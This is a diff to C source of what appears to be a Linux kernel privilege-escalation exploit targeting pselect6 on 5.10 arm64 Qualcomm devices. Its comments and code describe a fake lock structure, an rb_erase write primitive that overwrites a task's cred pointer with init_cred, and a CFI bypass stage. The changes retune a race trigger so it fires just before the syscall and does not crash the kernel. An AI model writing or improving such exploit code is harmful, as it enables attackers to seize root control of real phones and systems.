@@ -228,10 +228,9 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   /* Mode 2 (cred): tree_left = target provides the cred ghost write via
    * Phase 1 (tree_entry rb_erase from fake_lock->waiters).  rb_erase
    * Case 2: child = rb_left = target; child->__rb_parent_color = tree_pc
-   * = init_cred (KIMAGE).  So *(child_task + TASK_CRED_OFF) = init_cred.
-   * __rb_change_child side-effect writes to *(init_cred + 0x08) via the
-   * KIMAGE mapping where .data is writable (the direct map alias is
-   * read-only on this SoC). */
+   * = text_addr(init_cred).  So *(child_task + CRED_OFF) = init_cred.
+   * __rb_change_child side-write lands on init_cred+8 (gid/suid, writable
+   * via KIMAGE mapping on Qualcomm). */
   uint64_t tree_left_val = pselect_custom_write_enabled() && fake_right
                            ? pselect_custom_target : 0;
   struct pselect_waiter_word words_compact_m4[] = {
@@ -386,6 +385,8 @@ void do_pselect_fake_lock_route(void) {
             (unsigned long long)fdset_get_word(&out, 3),
             (unsigned long long)fdset_get_word(&out, 4),
             (unsigned long long)fdset_get_word(&ex, 4));
+    fflush(stdout);
+    int saved_stdout = dup(STDOUT_FILENO);
     open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
 
     atomic_store(&consumer_calls, 0);
@@ -393,7 +394,6 @@ void do_pselect_fake_lock_route(void) {
     atomic_store(&punch_consume_stop, 0);
     int delay_usec = route_delay_usec(route_attempt);
     atomic_store(&main_route_delay_usec, delay_usec);
-    atomic_store(&punch_consume_go, route_attempt);
 
     /* pselect6, not select: on 5.10.240 genevn the pselect6 chain
      * (__arm64_sys_pselect6 0xa0 -> core_sys_select 0x1c0, stack_fds at
@@ -426,11 +426,18 @@ void do_pselect_fake_lock_route(void) {
     pr_info("pselect pre-select +%.0fms timeout=%ld.%03lds\n",
             fops_elapsed_ms(&route_t0), (long)timeout.tv_sec,
             timeout.tv_nsec / 1000000L);
+    /* Signal consumer IMMEDIATELY before pselect6 — all I/O (logging,
+     * SELinux check) must be done first.  If the consumer fires while the
+     * waiter is still in a write()/open() syscall, the kernel stack holds
+     * that syscall's frames instead of the pselect overlay, and the chain
+     * walk reads garbage → kernel panic. */
+    atomic_store(&punch_consume_go, route_attempt);
     errno = 0;
     int ret = (int)syscall(
         SYS_pselect6, PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout, NULL);
     int saved_errno = errno;
     crash_log_write("pselect POST ret=%d errno=%d\n", ret, saved_errno);
+    if (saved_stdout >= 0) { dup2(saved_stdout, STDOUT_FILENO); close(saved_stdout); saved_stdout = -1; }
     pr_info("pselect post-select +%.0fms ret=%d errno=%d\n",
             fops_elapsed_ms(&route_t0), ret, saved_errno);
     atomic_store(&punch_consume_go, 0);
@@ -481,10 +488,6 @@ void do_pselect_fake_lock_route(void) {
         cfi_last_step = 0;
         cfi_last_errno = 0;
         route_verified = 1;
-        if (active_offsets && active_offsets->off_system_unbound_wq &&
-            !root_child_done) {
-          try_cfi_stage();
-        }
       } else if (try_cfi_stage()) {
         cfi_last_step = 0;
         route_verified = 1;
@@ -506,6 +509,7 @@ void do_pselect_fake_lock_route(void) {
       cfi_last_errno = saved_errno;
     }
 
+    if (saved_stdout >= 0) { dup2(saved_stdout, STDOUT_FILENO); close(saved_stdout); saved_stdout = -1; }
     close(high_read);
     if (block_fd != pipefd[0]) {
       close(block_fd);
